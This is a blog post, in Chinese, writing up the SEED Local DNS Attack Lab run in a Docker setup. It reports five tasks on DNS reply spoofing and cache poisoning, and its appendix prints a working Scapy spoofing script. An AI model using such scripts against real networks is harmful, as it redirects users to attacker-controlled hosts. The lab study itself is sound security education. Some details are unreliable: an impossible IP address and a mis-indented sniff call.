@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fire32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fire16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.mrdothing.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="完成时间 2022.11.29 一.实验目标DNS(域名系统)是互联网的电话簿;它将主机名转换为IP地址(反之亦然)。这种转换是通过DNS解析进行的，它发生在幕后。DNS攻击操作这个解决方案以各种方式进行，目的是误导用户到其他目的地，它们通常是恶意的。这个实验室的目的是了解这种攻击是如何发生的。学生将首先建立和配置DNS服务器，然后他们将尝试各种DNS攻击的目标也是在实验室环境中。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Local DNS Attack Lab">
+<meta property="og:url" content="https://www.mrdothing.com/2022/11/29/DNS_local/index.html">
+<meta property="og:site_name" content="Mr.Dothing">
+<meta property="og:description" content="完成时间 2022.11.29 一.实验目标DNS(域名系统)是互联网的电话簿;它将主机名转换为IP地址(反之亦然)。这种转换是通过DNS解析进行的，它发生在幕后。DNS攻击操作这个解决方案以各种方式进行，目的是误导用户到其他目的地，它们通常是恶意的。这个实验室的目的是了解这种攻击是如何发生的。学生将首先建立和配置DNS服务器，然后他们将尝试各种DNS攻击的目标也是在实验室环境中。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004804.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005997.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005381.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005838.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006474.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006694.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007782.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008709.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008028.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009187.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010491.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010663.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010398.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010809.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011373.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011847.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011763.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181012617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013939.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013320.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013394.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013586.png">
+<meta property="article:published_time" content="2022-11-29T14:11:12.000Z">
+<meta property="article:modified_time" content="2023-09-18T02:39:13.216Z">
+<meta property="article:author" content="Crazyoo">
+<meta property="article:tag" content="seedlab2.0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004397.png">
+
+<link rel="canonical" href="https://www.mrdothing.com/2022/11/29/DNS_local/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Local DNS Attack Lab | Mr.Dothing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mr.Dothing</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.mrdothing.com/2022/11/29/DNS_local/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Crazyoo">
+      <meta itemprop="description" content="You get what you get.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.Dothing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Local DNS Attack Lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-29 22:11:12" itemprop="dateCreated datePublished" datetime="2022-11-29T22:11:12+08:00">2022-11-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-18 10:39:13" itemprop="dateModified" datetime="2023-09-18T10:39:13+08:00">2023-09-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>完成时间 <em>2022.11.29</em></p>
+<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>DNS(域名系统)是互联网的电话簿;它将主机名转换为IP地址(反之亦然)。这种转换是通过DNS解析进行的，它发生在幕后。DNS攻击操作这个解决方案以各种方式进行，目的是误导用户到其他目的地，它们通常是恶意的。这个实验室的目的是了解这种攻击是如何发生的。学生将首先建立和配置DNS服务器，然后他们将尝试各种DNS攻击的目标也是在实验室环境中。</p>
+<span id="more"></span>
+<p>攻击本地受害者和远程DNS服务器的难度是完全不同的。因此,我们开发了两个实验室，一个专注于本地DNS攻击，另一个专注于远程DNS攻击。这个实验室关注本地攻击。本实验室涵盖以下主题:</p>
+<blockquote>
+<p>•DNS及其工作原理</p>
+<p>•DNS服务器设置</p>
+<p>•DNS缓存投毒攻击</p>
+<p>•欺骗DNS响应</p>
+<p>•包嗅探和欺骗</p>
+<p>•Scapy工具</p>
+</blockquote>
+<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-DNS协议"><a href="#2-1-DNS协议" class="headerlink" title="2.1 DNS协议"></a>2.1 DNS协议</h3><p>域名系统（英语：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p>
+<h3 id="2-2-拓扑搭建"><a href="#2-2-拓扑搭建" class="headerlink" title="2.2 拓扑搭建"></a>2.2 拓扑搭建</h3><p>DNS 缓存中毒攻击的主要目标是本地 DNS 服务器。 显然，攻击真实的是非法的服务器，所以我们需要架设自己的DNS服务器来进行攻击实验。 实验室环境需要四台独立的机器：一台给受害者，一台给本地 DNS 服务器，另外两台给攻击者。实验环境设置如图 1 所示。本实验侧重于本地攻击，因此我们将所有这些同一局域网上的机器。</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004397.png"></p>
+<h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p>
+<p>2．Docker.</p>
+<h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-Directly-Spoofing-Response-to-User"><a href="#4-1-Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="4.1 Task 1: Directly Spoofing Response to User"></a>4.1 Task 1: Directly Spoofing Response to User</h3><p>当用户在网络浏览器中键入网站名称（主机名，例如 <a target="_blank" rel="noopener" href="http://www.example.com)时,用户电脑会向本地dns服务器发送dns请求,解析主机的ip地址姓名./">www.example.com）时，用户电脑会向本地DNS服务器发送DNS请求，解析主机的IP地址姓名。</a> 攻击者可以嗅探 DNS 请求消息，然后他们可以立即创建一个虚假的 DNS 响应，并发送回用户机器。 如果假回复比真实回复早到达，它将被接受用户机器。见下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004804.png"></p>
+<p>请编写一个程序来发起这样的攻击。</p>
+<p>实现过程：</p>
+<p>在本次攻击时，主要是针对于用户向本地DNS发送请求时，攻击者对用户进行DNS响应，因此可以进行报文伪造的过程如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005997.png"></p>
+<p>根据实验手册中的脚本进行改写如上，其中网卡可以在攻击者主机中使用ip a查询得到，如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005381.png"></p>
+<p>在进行攻击前，先利用dig指令查询<a href="http://www.example.net的原始DNS名称服务：">www.example.net的原始DNS名称服务：</a></p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005838.png"></p>
+<p>可以看到其为 93.781.216.34，然后开始进行攻击：</p>
+<p>Step1：</p>
+<p>清除本地DNS服务器的缓存，如果不进行清除的话，用户在向本地DNS服务器进行查询时，其响应速度快于构造报文的转发速度，因而会导致攻击失败。</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006474.png"></p>
+<p>Step2：</p>
+<p>执行攻击脚本，再次利用dig查询网址的DNS服务名称，如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006694.png"></p>
+<p>可以观察到被成功修改为了1.1.1.1，证明攻击成功。</p>
+<p>Step3：</p>
+<p>查看脚本在网络中嗅探到的报文：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006931.png"></p>
+<p>可以观察到该报文是从用户发给本地DNS服务器的，而攻击者正是在该过程中，先于本地DNS服务器，将伪造的报文发送给用户，从而实现攻击。</p>
+<h3 id="4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a>4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h3><p>上述攻击针对的是用户的机器。为了达到持久的效果，每次用户的机器发出对 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的 DNS 查询 攻击者的机器必须发出一个欺骗性的DNS 响应。这可能不是那么有效；有一种更好的方法来进行攻击DNS 服务器，而不是用户的机器。当本地 DNS 服务器收到查询时，它首先从自己的缓存中查找答案；如果答案在那里，DNS 服务器将简单地使用其缓存中的信息进行回复。如果答案不在缓存，DNS 服务器将尝试从其他 DNS 服务器获取答案。当它得到答案时，它会将答案存储在缓存中，因此下次无需询问其他 DNS 服务器。参见图 2。因此，如果攻击者可以欺骗其他 DNS 服务器的响应，则本地 DNS 服务器将保留缓存中的欺骗性响应会持续一段时间。下次，当用户的机器想要解析相同的主机名，它将从缓存中获取欺骗响应。这样，攻击者只需要欺骗一次，影响将持续到缓存信息过期。这种攻击称为 DNS 缓存中毒。请修改上一个任务中使用的程序以进行此攻击。</p>
+<p>实现过程：</p>
+<p>对python脚本做如下修改：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007740.png"></p>
+<p>修改主要在于嗅探使过滤器的内容，将其源主机修改为本地DNS服务器的IP地址即可。同理在攻击前应该先查看目标网站的原始DNS名称服务内容，同task1中的内容，故不重复。然后开始进行攻击：</p>
+<p>Step1：</p>
+<p>清除本地DNS服务器中已有的缓存</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007782.png"></p>
+<p>Step2：</p>
+<p>执行攻击脚本，并且用dig命令查看目标网站的DNS域名如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008873.png"></p>
+<p>可以观察到来自于本地DNS服务器中的内容已经修改为了脚本所指定的2.2.2.2，然后再本地DNS服务器中查看缓存内容：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008709.png"></p>
+<p>攻击脚本中的内容已经成功写入本地DNS服务器，证明攻击成功。</p>
+<p>Step3：</p>
+<p>在攻击后，可以查看攻击脚本执行时，所嗅探到的报文如下，是在本地DNS与目标网站的DNS进行通信时，所截获然后进行伪造的。</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008028.png"></p>
+<h3 id="4-3-Task-3-Spoofing-NS-Records"><a href="#4-3-Task-3-Spoofing-NS-Records" class="headerlink" title="4.3 Task 3: Spoofing NS Records"></a>4.3 Task 3: Spoofing NS Records</h3><p>在上一个任务中，我们的 DNS 缓存投毒攻击只影响一个主机名，即<a target="_blank" rel="noopener" href="http://www.example.com.如果用户试图获取另一个主机名的/">www.example.com。如果用户试图获取另一个主机名的</a> IP 地址，例如 mail.example.com，我们需要启动再次袭击。 如果我们发起一次可以影响整个 example.com 的攻击，效率会更高领域。这个想法是在 DNS 回复中使用 Authority 部分。 基本上，当我们欺骗回复时，另外为了欺骗答案（在答案部分），我们在授权部分添加以下内容。 当这个条目由本地 DNS 服务器缓存，ns.attacker32.com 将用作将来的名称服务器查询 example.com 域中的任何主机名。 由于 ns.attacker32.com 由攻击者，它可以为任何查询提供伪造的答案。 本机IP地址为10.9.0.153我们的设置。请在你的攻击代码中添加一条伪造的NS记录，然后发起攻击。</p>
+<p>实现过程：</p>
+<p>实现前我们可以现在攻击者的DNS中查看其所指定的域名内容如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009187.png"></p>
+<p>然后构造攻击脚本如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009001.png"></p>
+<p>在task2的基础上添加了The Authority Section，作为伪造内容。利用该脚本即可进行如下攻击：</p>
+<p>Step1：</p>
+<p>清空本地DNS的缓存内容：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010491.png"></p>
+<p>Step2：</p>
+<p>执行攻击脚本，并且利用dig命令查询目标网址的DNS名称如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010663.png"></p>
+<p>可以观察到其内容被成功修改为3.3.3.3，然后再本地DNS服务器上查看当前的缓存内容如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010398.png"></p>
+<p>观察到example.com部分的内容均有脚本所设置的攻击者DNS提供服务，然后利用dig命令查看其是否生效，如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010809.png"></p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011373.png"></p>
+<p>可以看到其均为攻击者DNS所指定的内容，因而攻击成功。</p>
+<p>在此处关于<a href="http://www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。">www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。</a></p>
+<h3 id="4-4-Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#4-4-Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="4.4 Task 4: Spoofing NS Records for Another Domain"></a>4.4 Task 4: Spoofing NS Records for Another Domain</h3><p>在前面的攻击中，我们成功地毒化了本地 DNS 服务器的缓存，所以 ns.attacker32.com成为 example.com 域的名称服务器。 受到这一成功的启发，我们想扩展它对其他领域的影响。 即，在由对 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的查询触发的欺骗响应中，我们想在授权部分添加额外的条目（见下文），所以 ns.attacker32.com 也用作 google.com 的名称服务器。</p>
+<p>请稍微修改您的攻击代码，以对您本地的 DNS 服务器发起上述攻击。 之后攻击，检查 DNS 缓存并查看缓存了哪些记录。 请描述并解释你的观察结果。应该注意的是，我们正在攻击的查询仍然是对 example.com 的查询，而不是对google.com。</p>
+<p>实现过程：</p>
+<p>修改脚本代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011847.png"></p>
+<p>即在授权部分将谷歌的网站也添加进去，然后再利用该脚本进行如下攻击：</p>
+<p>Step1：</p>
+<p>清空本地DNS的缓存内容</p>
+<p>Step2：</p>
+<p>在攻击者主机中执行攻击脚本，然后再用户主机中利用dig命令查询目标网站的DNS名称如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011763.png"></p>
+<p>可以观察到其内容被成功修改为4.4.4.4，随后再本地DNS服务器上查询缓存：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181012617.png"></p>
+<p>可以观察到google并没有被写入到本地DNS服务器上，而是只有example.com的DNS被成功修改为了攻击者所提供的DNS，通过查询<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.7">RFC1034</a> 3.7节中关于authority section 部分的解释，原因在于，在该部分中应该描述answer section中数据的权威域名服务，而在所构造的报文answer部分是根据嗅探到的报文所构建的，而在dig请求中并没google.com 因此answer部分没有，所以只在 authority section 部分的构造并不会写入本地的DNS。</p>
+<h3 id="4-5-Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#4-5-Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="4.5 Task 5: Spoofing Records in the Additional Section"></a>4.5 Task 5: Spoofing Records in the Additional Section</h3><p>在 DNS 回复中，有一个称为附加部分的部分，用于提供附加信息。在实践中，它主要用于为一些主机名提供IP地址，尤其是那些出现在管理局部分。 这个任务的目标是欺骗本节中的一些条目，看看它们是否将被目标本地 DNS 服务器成功缓存。 特别是，在响应查询时<a target="_blank" rel="noopener" href="http://www.example.com,我们在欺骗回复中添加以下条目,除了答案部分条目1和2与权限部分中的主机名相关./">www.example.com，我们在欺骗回复中添加以下条目，除了答案部分条目1和2与权限部分中的主机名相关。</a> Entry 完全无关紧要回复中的任何条目，但它为用户提供了“优雅”的帮助，因此他们无需查找 IP脸书地址。 请使用 Scapy 欺骗这样的 DNS 回复。 你的工作是报告哪些条目将是成功缓存，哪些条目不会被缓存； 请解释原因。</p>
+<p>实现过程：</p>
+<p>修改脚本代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013939.png"></p>
+<p>即添加三个实验手册中所指定的附加部分。然后利用该脚本进行攻击如下：</p>
+<p>Step1：</p>
+<p>清空本地DNS服务器的缓存：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013320.png"></p>
+<p>Step2：</p>
+<p>在攻击者主机中执行攻击脚本，然后再用户主机上利用dig指令查询目标网站的DNS名称服务如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013394.png"></p>
+<p>可以观察到其IP被成功修改为了脚本中所指定的5.5.5.5，然后在本地服务器上查看缓存内容如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013586.png"></p>
+<p>可以观察到只有example.com. 777548 IN NS ns.example.com. 和 ns.attacker32.com 被成功写入到本地DNS中，而其他在additional section的三个条目均没有被成功缓存。</p>
+<p>根据RFC1034中的实例以及对于query的介绍可以得知原因在于，additional section中应该补充回答的是在answer section和authority section中所出现的ns，而此处并没有出现<a target="_blank" rel="noopener" href="http://www.facebook.com/">www.facebook.com</a> 因此其并未被写入，而由于在answer section 中已经回答了<a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的IP为 5.5.5.5，所以 ns.examle.com 和 ns.attacker32.com 也并未被写入。</p>
+<h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.net&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.1.1.1&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.5 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task2</p>
